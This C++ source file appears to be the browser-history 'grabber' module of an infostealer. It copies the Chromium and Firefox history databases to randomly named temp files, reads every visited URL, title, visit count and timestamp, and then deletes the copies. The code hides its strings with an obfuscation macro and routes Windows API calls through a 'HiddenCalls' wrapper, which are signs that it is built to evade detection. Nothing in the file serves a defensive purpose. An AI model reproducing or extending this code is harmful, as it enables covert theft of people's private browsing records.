#include "History.hpp"
#include "Browsers_EntryPoint.hpp"
#include "winapi_structs.hpp"
#include <vector>
#include "sqlite3.h"
#include <filesystem>
#include "obfusheader.h"
#include "Helper.h"

namespace fs = std::filesystem;

#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "Shell32.lib")

std::vector<History> Browser::GetHistory() {
    std::vector<History> h;

    for (const auto& Chromium : chromiumBrowsers) {
        fs::path HHistory = fs::path(Chromium.profileLocation) / OBF("History");

        if (!fs::exists(HHistory)) {
            continue;
        }

        std::string tempdb = TEMP + OBF("\\") + RandomString(7) + OBF(".db");

        try {
            copy_file(HHistory, tempdb, fs::copy_options::overwrite_existing);
        }
        catch (fs::filesystem_error& e) {
            continue;
        }

        sqlite3* db = nullptr;
        sqlite3_stmt* stmt = nullptr;

        HANDLE hFile = HiddenCalls::CreateFileA(tempdb.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile == INVALID_HANDLE_VALUE) {
            continue;
        }

        if (sqlite3_open(tempdb.c_str(), &db) != SQLITE_OK) {
            sqlite3_close(db);
            HiddenCalls::CloseHandle(hFile);
            continue;
        }

        std::string query = OBF("SELECT url, title, visit_count, last_visit_time FROM urls");
        if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, nullptr) != SQLITE_OK) {
            sqlite3_close(db);
            HiddenCalls::CloseHandle(hFile);
            continue;
        }

        while (sqlite3_step(stmt) == SQLITE_ROW) {
            History historyEntry;
            historyEntry.url = std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0)));
            historyEntry.title = std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1)));
            historyEntry.visit_count = sqlite3_column_int(stmt, 2);
            historyEntry.last_visit_time = std::to_string(sqlite3_column_int64(stmt, 3));

            h.push_back(historyEntry);
        }

        sqlite3_finalize(stmt);
        sqlite3_close(db);
        HiddenCalls::CloseHandle(hFile);

        try {
            fs::remove(tempdb);
        }
        catch (...) {}
    }
    for (const auto& Gecko : geckoBrowsers) {

        fs::path HHistory = fs::path(Gecko.profileLocation) / OBF("places.sqlite");

        if (!fs::exists(HHistory)) {
            continue;
        }

        std::string history = TEMP + OBF("\\") + RandomString(7) + OBF(".db");

        try {
            copy_file(HHistory, history, fs::copy_options::overwrite_existing);
        }
        catch (fs::filesystem_error& e) {
            continue;
        }

        sqlite3* db = nullptr;
        sqlite3_stmt* stmt = nullptr;

        HANDLE hFile = HiddenCalls::CreateFileA(history.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile == INVALID_HANDLE_VALUE) {
            continue;
        }

        if (sqlite3_open(history.c_str(), &db) != SQLITE_OK) {
            HiddenCalls::CloseHandle(hFile);
            continue;
        }

        std::string query = OBF("SELECT title, url, visit_count, last_visit_date FROM moz_places WHERE title IS NOT NULL");
        if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, nullptr) != SQLITE_OK) {
            sqlite3_close(db);
            HiddenCalls::CloseHandle(hFile);
            continue;
        }

        while (sqlite3_step(stmt) == SQLITE_ROW) {
            History historyEntry;
            historyEntry.title = std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0)));
            historyEntry.url = std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1)));
            historyEntry.visit_count = sqlite3_column_int(stmt, 2);
            historyEntry.last_visit_time = std::to_string(sqlite3_column_int64(stmt, 3));

            h.push_back(historyEntry);
        }

        sqlite3_finalize(stmt);
        sqlite3_close(db);
        HiddenCalls::CloseHandle(hFile);

        try {
            fs::remove(history);
        }
        catch (...) {}
    }

    DEBUG_PRINT(L"History Grabber Passed");


    return h;
}
